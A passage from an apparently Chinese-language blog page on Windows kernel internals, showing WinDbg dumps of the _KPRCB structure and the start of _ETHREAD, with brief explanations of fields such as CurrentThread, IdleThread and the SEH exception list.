class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_KPRCB 0x80b97120</span><br><span class="line">   +0x000 MinorVersion     : 1</span><br><span class="line">   +0x002 MajorVersion     : 1</span><br><span class="line">   +0x004 CurrentThread    : 0x88a20a60 _KTHREAD</span><br><span class="line">   +0x008 NextThread       : (null) </span><br><span class="line">   +0x00c IdleThread       : 0x83d764c0 _KTHREAD</span><br><span class="line">   +0x010 LegacyNumber     : 0 &#x27;&#x27;</span><br><span class="line">   +0x011 NestingLevel     : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x012 BuildType        : 0</span><br><span class="line">   +0x014 CpuType          : 6 &#x27;&#x27;</span><br><span class="line">   +0x015 CpuID            : 1 &#x27;&#x27;</span><br><span class="line">   +0x016 CpuStep          : 0xb701</span><br><span class="line">   +0x016 CpuStepping      : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x017 CpuModel         : 0xb7 &#x27;&#x27;</span><br><span class="line">   +0x018 ProcessorState   : _KPROCESSOR_STATE</span><br><span class="line">   +0x338 KernelReserved   : [16] 0</span><br><span class="line">   +0x378 HalReserved      : [16] 0x969600</span><br><span class="line">   +0x3b8 CFlushSize       : 0x40</span><br><span class="line">   +0x3bc CoresPerPhysicalProcessor : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x3bd LogicalProcessorsPerCore : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x3be PrcbPad0         : [2]  &quot;&quot;</span><br><span class="line">   +0x3c0 MHz              : 0x973</span><br><span class="line">   +0x3c4 CpuVendor        : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x3c5 GroupIndex       : 0 &#x27;&#x27;</span><br><span class="line">   +0x3c6 Group            : 0</span><br><span class="line">   +0x3c8 GroupSetMember   : 1</span><br><span class="line">   +0x3cc Number           : 0</span><br><span class="line">   +0x3d0 PrcbPad1         : [72]  &quot;&quot;</span><br><span class="line">   +0x418 LockQueue        : [17] _KSPIN_LOCK_QUEUE</span><br><span class="line">   +0x4a0 NpxThread        : 0x88a20a60 _KTHREAD</span><br><span class="line">   +0x4a4 InterruptCount   : 0xaf7b</span><br><span class="line">   +0x4a8 KernelTime       : 0x16d2</span><br><span class="line">   +0x4ac UserTime         : 0x385</span><br><span class="line">   +0x4b0 DpcTime          : 0x1fe</span><br><span class="line">   +0x4b4 DpcTimeCount     : 0</span><br><span class="line">   +0x4b8 InterruptTime    : 0x58</span><br><span class="line">   +0x4bc AdjustDpcThreshold : 0x11</span><br><span class="line">   +0x4c0 PageColor        : 0x1356</span><br><span class="line">   +0x4c4 DebuggerSavedIRQL : 0x1c &#x27;&#x27;</span><br><span class="line">   +0x4c5 NodeColor        : 0 &#x27;&#x27;</span><br><span class="line">   +0x4c6 PrcbPad20        : [2]  &quot;&quot;</span><br><span class="line">   +0x4c8 NodeShiftedColor : 0</span><br><span class="line">   +0x4cc ParentNode       : 0x83d76440 _KNODE</span><br><span class="line">   +0x4d0 SecondaryColorMask : 0xff</span><br><span class="line">   +0x4d4 DpcTimeLimit     : 0</span><br><span class="line">   +0x4d8 MsrIa32TsxCtrl   : 0</span><br><span class="line">   +0x4e0 CcFastReadNoWait : 0</span><br><span class="line">   +0x4e4 CcFastReadWait   : 0x1514</span><br><span class="line">   +0x4e8 CcFastReadNotPossible : 0</span><br><span class="line">   +0x4ec CcCopyReadNoWait : 0</span><br><span class="line">   +0x4f0 CcCopyReadWait   : 0x176a</span><br><span class="line">   +0x4f4 CcCopyReadNoWaitMiss : 0</span><br><span class="line">   +0x4f8 MmSpinLockOrdering : 0n0</span><br><span class="line">   +0x4fc IoReadOperationCount : 0n7085</span><br><span class="line">   +0x500 IoWriteOperationCount : 0n1965</span><br><span class="line">   +0x504 IoOtherOperationCount : 0n82423</span><br><span class="line">   +0x508 IoReadTransferCount : _LARGE_INTEGER 0x30316f8</span><br><span class="line">   +0x510 IoWriteTransferCount : _LARGE_INTEGER 0xc7b2db</span><br><span class="line">   +0x518 IoOtherTransferCount : _LARGE_INTEGER 0x308a77</span><br><span class="line">   +0x520 CcFastMdlReadNoWait : 0</span><br><span class="line">   +0x524 CcFastMdlReadWait : 0</span><br><span class="line">   +0x528 CcFastMdlReadNotPossible : 0</span><br><span class="line">   +0x52c CcMapDataNoWait  : 0</span><br><span class="line">   +0x530 CcMapDataWait    : 0x995f</span><br><span class="line">   +0x534 CcPinMappedDataCount : 0x891</span><br><span class="line">   +0x538 CcPinReadNoWait  : 0</span><br><span class="line">   +0x53c CcPinReadWait    : 0x2b1</span><br><span class="line">   +0x540 CcMdlReadNoWait  : 0</span><br><span class="line">   +0x544 CcMdlReadWait    : 1</span><br><span class="line">   +0x548 CcLazyWriteHotSpots : 0xd</span><br><span class="line">   +0x54c CcLazyWriteIos   : 0x88</span><br><span class="line">   +0x550 CcLazyWritePages : 0x375</span><br><span class="line">   +0x554 CcDataFlushes    : 0x18e</span><br><span class="line">   +0x558 CcDataPages      : 0x4ff</span><br><span class="line">   +0x55c CcLostDelayedWrites : 0</span><br><span class="line">   +0x560 CcFastReadResourceMiss : 0</span><br><span class="line">   +0x564 CcCopyReadWaitMiss : 0x371</span><br><span class="line">   +0x568 CcFastMdlReadResourceMiss : 0</span><br><span class="line">   +0x56c CcMapDataNoWaitMiss : 0</span><br><span class="line">   +0x570 CcMapDataWaitMiss : 0x7f0</span><br><span class="line">   +0x574 CcPinReadNoWaitMiss : 0</span><br><span class="line">   +0x578 CcPinReadWaitMiss : 0x16</span><br><span class="line">   +0x57c CcMdlReadNoWaitMiss : 0</span><br><span class="line">   +0x580 CcMdlReadWaitMiss : 0</span><br><span class="line">   +0x584 CcReadAheadIos   : 0x772</span><br><span class="line">   +0x588 KeAlignmentFixupCount : 0</span><br><span class="line">   +0x58c KeExceptionDispatchCount : 0x1d1</span><br><span class="line">   +0x590 KeSystemCalls    : 0x75b693</span><br><span class="line">   +0x594 AvailableTime    : 0x331</span><br><span class="line">   +0x598 PrcbPad22        : [2] 0</span><br><span class="line">   +0x5a0 PPLookasideList  : [16] _PP_LOOKASIDE_LIST</span><br><span class="line">   +0x620 PPNPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">   +0xf20 PPPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">   +0x1820 PacketBarrier    : 0</span><br><span class="line">   +0x1824 ReverseStall     : 0n4</span><br><span class="line">   +0x1828 IpiFrame         : (null) </span><br><span class="line">   +0x182c PrcbPad3         : [52]  &quot;&quot;</span><br><span class="line">   +0x1860 CurrentPacket    : [3] (null) </span><br><span class="line">   +0x186c TargetSet        : 0</span><br><span class="line">   +0x1870 WorkerRoutine    : (null) </span><br><span class="line">   +0x1874 IpiFrozen        : 0</span><br><span class="line">   +0x1878 PrcbPad4         : [40]  &quot;&quot;</span><br><span class="line">   +0x18a0 RequestSummary   : 0</span><br><span class="line">   +0x18a4 SignalDone       : (null) </span><br><span class="line">   +0x18a8 TrappedSecurityDomain : 0x00000001`0000001d</span><br><span class="line">   +0x18b0 BpbState         : 0x2 &#x27;&#x27;</span><br><span class="line">   +0x18b0 BpbCpuIdle       : 0y0</span><br><span class="line">   +0x18b0 BpbFlushRsbOnTrap : 0y1</span><br><span class="line">   +0x18b0 BpbIbpbOnReturn  : 0y0</span><br><span class="line">   +0x18b0 BpbIbpbOnTrap    : 0y0</span><br><span class="line">   +0x18b0 BpbReserved      : 0y0000</span><br><span class="line">   +0x18b1 BpbFeatures      : 0x2 &#x27;&#x27;</span><br><span class="line">   +0x18b1 BpbClearOnIdle   : 0y0</span><br><span class="line">   +0x18b1 BpbEnabled       : 0y1</span><br><span class="line">   +0x18b1 BpbSmep          : 0y0</span><br><span class="line">   +0x18b1 BpbFeaturesReserved : 0y00000 (0)</span><br><span class="line">   +0x18b2 BpbCurrentSpecCtrl : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x18b3 BpbKernelSpecCtrl : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x18b4 BpbNmiSpecCtrl   : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x18b5 BpbUserSpecCtrl  : 0 &#x27;&#x27;</span><br><span class="line">   +0x18b6 PrcbPad50        : [42]  &quot;&quot;</span><br><span class="line">   +0x18e0 DpcData          : [2] _KDPC_DATA</span><br><span class="line">   +0x1908 DpcStack         : 0x80d90000 Void</span><br><span class="line">   +0x190c MaximumDpcQueueDepth : 0n4</span><br><span class="line">   +0x1910 DpcRequestRate   : 0</span><br><span class="line">   +0x1914 MinimumDpcRate   : 3</span><br><span class="line">   +0x1918 DpcLastCount     : 0x496b</span><br><span class="line">   +0x191c PrcbLock         : 0</span><br><span class="line">   +0x1920 DpcGate          : _KGATE</span><br><span class="line">   +0x1930 ThreadDpcEnable  : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x1931 QuantumEnd       : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x1932 DpcRoutineActive : 0 &#x27;&#x27;</span><br><span class="line">   +0x1933 IdleSchedule     : 0 &#x27;&#x27;</span><br><span class="line">   +0x1934 DpcRequestSummary : 0n8</span><br><span class="line">   +0x1934 DpcRequestSlot   : [2] 0n8</span><br><span class="line">   +0x1934 NormalDpcState   : 0n8</span><br><span class="line">   +0x1936 DpcThreadActive  : 0y0</span><br><span class="line">   +0x1936 ThreadDpcState   : 0n0</span><br><span class="line">   +0x1938 TimerHand        : 0x1a56</span><br><span class="line">   +0x193c LastTick         : 0x1a57</span><br><span class="line">   +0x1940 MasterOffset     : 0n81398</span><br><span class="line">   +0x1944 PrcbPad41        : [2] 0</span><br><span class="line">   +0x194c PeriodicCount    : 0</span><br><span class="line">   +0x1950 PeriodicBias     : 0</span><br><span class="line">   +0x1958 TickOffset       : 0x1236b</span><br><span class="line">   +0x1960 TimerTable       : _KTIMER_TABLE</span><br><span class="line">   +0x31a0 CallDpc          : _KDPC</span><br><span class="line">   +0x31c0 ClockKeepAlive   : 0n1</span><br><span class="line">   +0x31c4 ClockCheckSlot   : 0 &#x27;&#x27;</span><br><span class="line">   +0x31c5 ClockPollCycle   : 0xa8 &#x27;&#x27;</span><br><span class="line">   +0x31c6 PrcbPad6         : [2]  &quot;&quot;</span><br><span class="line">   +0x31c8 DpcWatchdogPeriod : 0n0</span><br><span class="line">   +0x31cc DpcWatchdogCount : 0n0</span><br><span class="line">   +0x31d0 ThreadWatchdogPeriod : 0n0</span><br><span class="line">   +0x31d4 ThreadWatchdogCount : 0n0</span><br><span class="line">   +0x31d8 KeSpinLockOrdering : 0n0</span><br><span class="line">   +0x31dc PrcbPad70        : [1] 0</span><br><span class="line">   +0x31e0 WaitListHead     : _LIST_ENTRY [ 0x87a1cdbc - 0x86928ae4 ]</span><br><span class="line">   +0x31e8 WaitLock         : 0</span><br><span class="line">   +0x31ec ReadySummary     : 0x100</span><br><span class="line">   +0x31f0 QueueIndex       : 1</span><br><span class="line">   +0x31f4 DeferredReadyListHead : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x31f8 StartCycles      : 0x0000005d`20e43ca2</span><br><span class="line">   +0x3200 CycleTime        : 0x00000020`5b03abb8</span><br><span class="line">   +0x3208 HighCycleTime    : 0x20</span><br><span class="line">   +0x320c PrcbPad71        : 0</span><br><span class="line">   +0x3210 PrcbPad72        : [2] 0</span><br><span class="line">   +0x3220 DispatcherReadyListHead : [32] _LIST_ENTRY [ 0x80b9a340 - 0x80b9a340 ]</span><br><span class="line">   +0x3320 ChainedInterruptList : (null) </span><br><span class="line">   +0x3324 LookasideIrpFloat : 0n2147483647</span><br><span class="line">   +0x3328 MmPageFaultCount : 0n380185</span><br><span class="line">   +0x332c MmCopyOnWriteCount : 0n6594</span><br><span class="line">   +0x3330 MmTransitionCount : 0n139141</span><br><span class="line">   +0x3334 MmCacheTransitionCount : 0n0</span><br><span class="line">   +0x3338 MmDemandZeroCount : 0n227545</span><br><span class="line">   +0x333c MmPageReadCount  : 0n43411</span><br><span class="line">   +0x3340 MmPageReadIoCount : 0n10075</span><br><span class="line">   +0x3344 MmCacheReadCount : 0n0</span><br><span class="line">   +0x3348 MmCacheIoCount   : 0n0</span><br><span class="line">   +0x334c MmDirtyPagesWriteCount : 0n0</span><br><span class="line">   +0x3350 MmDirtyWriteIoCount : 0n0</span><br><span class="line">   +0x3354 MmMappedPagesWriteCount : 0n0</span><br><span class="line">   +0x3358 MmMappedWriteIoCount : 0n0</span><br><span class="line">   +0x335c CachedCommit     : 0xa3</span><br><span class="line">   +0x3360 CachedResidentAvailable : 0xf9</span><br><span class="line">   +0x3364 HyperPte         : 0x80c00004 Void</span><br><span class="line">   +0x3368 PrcbPad8         : [4]  &quot;&quot;</span><br><span class="line">   +0x336c VendorString     : [13]  &quot;GenuineIntel&quot;</span><br><span class="line">   +0x3379 InitialApicId    : 0 &#x27;&#x27;</span><br><span class="line">   +0x337a LogicalProcessorsPerPhysicalProcessor : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x337b PrcbPad9         : [5]  &quot;&quot;</span><br><span class="line">   +0x3380 FeatureBits      : 0x60cd3fff</span><br><span class="line">   +0x3388 UpdateSignature  : _LARGE_INTEGER 0xffffffff`00000000</span><br><span class="line">   +0x3390 IsrTime          : 0</span><br><span class="line">   +0x3398 RuntimeAccumulation : 0x3eb41562</span><br><span class="line">   +0x33a0 PowerState       : _PROCESSOR_POWER_STATE</span><br><span class="line">   +0x3468 DpcWatchdogDpc   : _KDPC</span><br><span class="line">   +0x3488 DpcWatchdogTimer : _KTIMER</span><br><span class="line">   +0x34b0 WheaInfo         : 0x8691c0d0 Void</span><br><span class="line">   +0x34b4 EtwSupport       : 0x868d17d8 Void</span><br><span class="line">   +0x34b8 InterruptObjectPool : _SLIST_HEADER</span><br><span class="line">   +0x34c0 HypercallPageList : _SLIST_HEADER</span><br><span class="line">   +0x34c8 HypercallPageVirtual : 0x80d83000 Void</span><br><span class="line">   +0x34cc VirtualApicAssist : (null) </span><br><span class="line">   +0x34d0 StatisticsPage   : (null) </span><br><span class="line">   +0x34d4 RateControl      : (null) </span><br><span class="line">   +0x34d8 Cache            : [5] _CACHE_DESCRIPTOR</span><br><span class="line">   +0x3514 CacheCount       : 4</span><br><span class="line">   +0x3518 CacheProcessorMask : [5] 1</span><br><span class="line">   +0x352c PackageProcessorSet : _KAFFINITY_EX</span><br><span class="line">   +0x3538 PrcbPad91        : [1] 0</span><br><span class="line">   +0x353c CoreProcessorSet : 1</span><br><span class="line">   +0x3540 TimerExpirationDpc : _KDPC</span><br><span class="line">   +0x3560 SpinLockAcquireCount : 0x3465aa</span><br><span class="line">   +0x3564 SpinLockContentionCount : 0xb</span><br><span class="line">   +0x3568 SpinLockSpinCount : 0</span><br><span class="line">   +0x356c IpiSendRequestBroadcastCount : 0</span><br><span class="line">   +0x3570 IpiSendRequestRoutineCount : 0</span><br><span class="line">   +0x3574 IpiSendSoftwareInterruptCount : 0</span><br><span class="line">   +0x3578 ExInitializeResourceCount : 0x6bbf</span><br><span class="line">   +0x357c ExReInitializeResourceCount : 0x563</span><br><span class="line">   +0x3580 ExDeleteResourceCount : 0x58ac</span><br><span class="line">   +0x3584 ExecutiveResourceAcquiresCount : 0x2c9bf6</span><br><span class="line">   +0x3588 ExecutiveResourceContentionsCount : 0x649</span><br><span class="line">   +0x358c ExecutiveResourceReleaseExclusiveCount : 0x803a3</span><br><span class="line">   +0x3590 ExecutiveResourceReleaseSharedCount : 0x2494c7</span><br><span class="line">   +0x3594 ExecutiveResourceConvertsCount : 0x1bf</span><br><span class="line">   +0x3598 ExAcqResExclusiveAttempts : 0x7d665</span><br><span class="line">   +0x359c ExAcqResExclusiveAcquiresExclusive : 0x6d87b</span><br><span class="line">   +0x35a0 ExAcqResExclusiveAcquiresExclusiveRecursive : 0xfdd4</span><br><span class="line">   +0x35a4 ExAcqResExclusiveWaits : 0x346</span><br><span class="line">   +0x35a8 ExAcqResExclusiveNotAcquires : 0x16</span><br><span class="line">   +0x35ac ExAcqResSharedAttempts : 0x234556</span><br><span class="line">   +0x35b0 ExAcqResSharedAcquiresExclusive : 0x3244</span><br><span class="line">   +0x35b4 ExAcqResSharedAcquiresShared : 0x22d3fd</span><br><span class="line">   +0x35b8 ExAcqResSharedAcquiresSharedRecursive : 0x3f15</span><br><span class="line">   +0x35bc ExAcqResSharedWaits : 0x303</span><br><span class="line">   +0x35c0 ExAcqResSharedNotAcquires : 0</span><br><span class="line">   +0x35c4 ExAcqResSharedStarveExclusiveAttempts : 0x18051</span><br><span class="line">   +0x35c8 ExAcqResSharedStarveExclusiveAcquiresExclusive : 1</span><br><span class="line">   +0x35cc ExAcqResSharedStarveExclusiveAcquiresShared : 0x17faa</span><br><span class="line">   +0x35d0 ExAcqResSharedStarveExclusiveAcquiresSharedRecursive : 0xa6</span><br><span class="line">   +0x35d4 ExAcqResSharedStarveExclusiveWaits : 0</span><br><span class="line">   +0x35d8 ExAcqResSharedStarveExclusiveNotAcquires : 0</span><br><span class="line">   +0x35dc ExAcqResSharedWaitForExclusiveAttempts : 0</span><br><span class="line">   +0x35e0 ExAcqResSharedWaitForExclusiveAcquiresExclusive : 0</span><br><span class="line">   +0x35e4 ExAcqResSharedWaitForExclusiveAcquiresShared : 0</span><br><span class="line">   +0x35e8 ExAcqResSharedWaitForExclusiveAcquiresSharedRecursive : 0</span><br><span class="line">   +0x35ec ExAcqResSharedWaitForExclusiveWaits : 0</span><br><span class="line">   +0x35f0 ExAcqResSharedWaitForExclusiveNotAcquires : 0</span><br><span class="line">   +0x35f4 ExSetResOwnerPointerExclusive : 0</span><br><span class="line">   +0x35f8 ExSetResOwnerPointerSharedNew : 0x1d2</span><br><span class="line">   +0x35fc ExSetResOwnerPointerSharedOld : 0x74</span><br><span class="line">   +0x3600 ExTryToAcqExclusiveAttempts : 0</span><br><span class="line">   +0x3604 ExTryToAcqExclusiveAcquires : 0</span><br><span class="line">   +0x3608 ExBoostExclusiveOwner : 8</span><br><span class="line">   +0x360c ExBoostSharedOwners : 0</span><br><span class="line">   +0x3610 ExEtwSynchTrackingNotificationsCount : 0</span><br><span class="line">   +0x3614 ExEtwSynchTrackingNotificationsAccountedCount : 0</span><br><span class="line">   +0x3618 Context          : 0x80dc9340 _CONTEXT</span><br><span class="line">   +0x361c ContextFlags     : 0x10057</span><br><span class="line">   +0x3620 ExtendedState    : 0x80dc9000 _XSAVE_AREA</span><br><span class="line">   +0x3624 VectorToInterruptObject : [208] (null) </span><br><span class="line">   +0x3964 PrcbPad100       : [15] 0</span><br><span class="line">   +0x39a0 ProcessorSignature : 0xb0671</span><br><span class="line">   +0x39a4 PrcbShadowMappedPagePad1 : [335] 0</span><br><span class="line">   +0x3ee0 KernelDirectoryTableBase : 0</span><br><span class="line">   +0x3ee4 EspBaseShadow    : 0</span><br><span class="line">   +0x3ee8 UserEspShadow    : 0</span><br><span class="line">   +0x3eec ShadowFlags      : 0</span><br><span class="line">   +0x3ef0 UserDS           : 0</span><br><span class="line">   +0x3ef4 UserES           : 0</span><br><span class="line">   +0x3ef8 UserFS           : 0</span><br><span class="line">   +0x3efc EspIretd         : (null) </span><br><span class="line">   +0x3f00 RestoreSegOption : 0</span><br><span class="line">   +0x3f04 SavedEsi         : 0</span><br><span class="line">   +0x3f08 VerwSelector     : 0</span><br><span class="line">   +0x3f0a PrcbShadowPad    : 0</span><br><span class="line">   +0x3f0c TaskSwitchCount  : 0</span><br><span class="line">   +0x3f10 DbgLogs          : [512] 0</span><br><span class="line">   +0x4710 DbgCount         : 0</span><br><span class="line">   +0x4714 PrcbShadowMappedPagePad2 : [499] 0</span><br></pre></td></tr></table></figure><h4 id="ExceptionList"><a href="#ExceptionList" class="headerlink" title="ExceptionList"></a>ExceptionList</h4><p>错误链表，指向<code>EXCEPTION_REGISTRATION_RECORD</code>的列表，用于<code>SEH</code>，即为结构化异常处理，里面记录了异常处理函数。有人会称它为<code>SEH</code>链入口。</p><h4 id="CurrentThread"><a href="#CurrentThread" class="headerlink" title="CurrentThread"></a>CurrentThread</h4><p>当前<code>CPU</code>所执行线程的<code>ETHREAD</code>结构体。</p><h4 id="NextThread"><a href="#NextThread" class="headerlink" title="NextThread"></a>NextThread</h4><p>下一个<code>CPU</code>所执行线程的<code>ETHREAD</code>结构体。</p><h4 id="IdleThread"><a href="#IdleThread" class="headerlink" title="IdleThread"></a>IdleThread</h4><p>当所有的线程都执行完了<code>CPU</code>就执行这个线程。</p><h4 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h4><p><code>CPU</code>编号。</p><h4 id="ProcessorState"><a href="#ProcessorState" class="headerlink" title="ProcessorState"></a>ProcessorState</h4><p><code>CPU</code>状态，是<code>_KPROCESSOR_STATE</code>结构体。</p><h4 id="NpxThread"><a href="#NpxThread" class="headerlink" title="NpxThread"></a>NpxThread</h4><p><code>Npx</code>浮点处理器，最后一次用过浮点的线程。</p><h4 id="LogicalProcessorsPerPhysicalProcessor"><a href="#LogicalProcessorsPerPhysicalProcessor" class="headerlink" title="LogicalProcessorsPerPhysicalProcessor"></a>LogicalProcessorsPerPhysicalProcessor</h4><p>指明每个物理处理器有几个逻辑处理器。</p><h4 id="MHz"><a href="#MHz" class="headerlink" title="MHz"></a>MHz</h4><p><code>CPU</code>的频率。</p><h3 id="ETHREAD"><a href="#ETHREAD" class="headerlink" title="ETHREAD"></a>ETHREAD</h3><p>因为讲到了 <code>KTHREAD</code> 故把 <code>ETHREAD</code> 也讲一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _ETHREAD</span><br><span class="line">ntdll!_ETHREAD</span><br><span class="line">   +0x000 Tcb              : _KTHREAD</span><br><span class="line">   +0x200 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x208 ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +0x208 KeyedWaitChain   : _LIST_ENTRY</span><br><span class="line">   +0x210 ExitStatus       : Int4B</span><br><span 